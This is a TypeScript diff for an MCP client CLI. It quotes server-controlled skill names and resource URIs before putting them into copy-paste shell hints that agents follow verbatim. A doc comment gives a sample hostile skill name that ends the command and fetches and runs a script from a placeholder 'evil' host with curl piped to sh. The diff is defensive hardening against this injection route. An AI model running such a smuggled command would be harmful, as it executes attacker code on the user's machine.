@@ -901,7 +901,7 @@ export function formatResourceContents(
       lines.push(chalk.gray('(binary content not shown)'));
       lines.push(
         chalk.dim(
-          `↳ save to a file: mcpc ${target} resources-read ${item.uri || requestedUri} -o <file>`
+          `↳ save to a file: mcpc ${target} resources-read ${quoteShellArg(item.uri || requestedUri)} -o <file>`
         )
       );
     } else {
@@ -1024,7 +1024,9 @@ export function formatSkillDetail(
     lines.push(chalk.gray('(binary content not shown)'));
     if (options?.sessionName) {
       lines.push(
-        chalk.dim(`↳ save to a file: mcpc ${options.sessionName} resources-read ${uri} -o <file>`)
+        chalk.dim(
+          `↳ save to a file: mcpc ${options.sessionName} resources-read ${quoteShellArg(uri)} -o <file>`
+        )
       );
     }
   } else {
@@ -1056,7 +1058,7 @@ export function formatSkillDetail(
         lines.push('');
         lines.push(
           chalk.dim(
-            `To read one, run: mcpc ${options.sessionName} skills-get ${skill.frontmatter.name} ${name}`
+            `To read one, run: mcpc ${options.sessionName} skills-get ${quoteShellArg(skill.frontmatter.name)} ${quoteShellArg(name)}`
           )
         );
       }
@@ -1110,7 +1112,7 @@ export function formatDirectoryChildren(
     lines.push('');
     lines.push(
       directory
-        ? `To descend, run: mcpc ${sessionName} resources-directory-read ${directory.uri}`
+        ? `To descend, run: mcpc ${sessionName} resources-directory-read ${quoteShellArg(directory.uri)}`
         : `To read a file, run: mcpc ${sessionName} resources-read <uri>`
     );
   }
@@ -1578,12 +1580,26 @@ export function formatInfo(message: string): string {
  * For human-readable output only; never use it for `--json` output or actual file I/O.
  */
 export function formatPath(p: string, platform: NodeJS.Platform = process.platform): string {
+  return quoteShellArg(p, platform);
+}
+
+/**
+ * Quote a value for a copy-paste shell hint. Server-controlled strings — a skill name, a
+ * resource URI — are interpolated into `run: mcpc …` hints that agents follow verbatim, so
+ * anything outside a conservative safe set is wrapped in double quotes with the characters
+ * that stay special inside them escaped. A skill named `pdf; curl https://evil/x | sh #`
+ * then stays one argument instead of ending the command and starting another.
+ *
+ * Same rules as `formatPath` (which delegates here). Human-readable output only; never use
+ * it for `--json` output.
+ */
+export function quoteShellArg(value: string, platform: NodeJS.Platform = process.platform): string {
   const isSafe =
     platform === 'win32'
-      ? /^[A-Za-z0-9_./:@%+,=~\\-]+$/.test(p)
-      : /^[A-Za-z0-9_./:@%+,=~-]+$/.test(p);
-  if (isSafe) return p;
-  return `"${p.replace(/(["`$])/g, '\\$&')}"`;
+      ? /^[A-Za-z0-9_./:@%+,=~\\-]+$/.test(value)
+      : /^[A-Za-z0-9_./:@%+,=~-]+$/.test(value);
+  if (isSafe) return value;
+  return `"${value.replace(/(["`$])/g, '\\$&')}"`;
 }
 
 /**
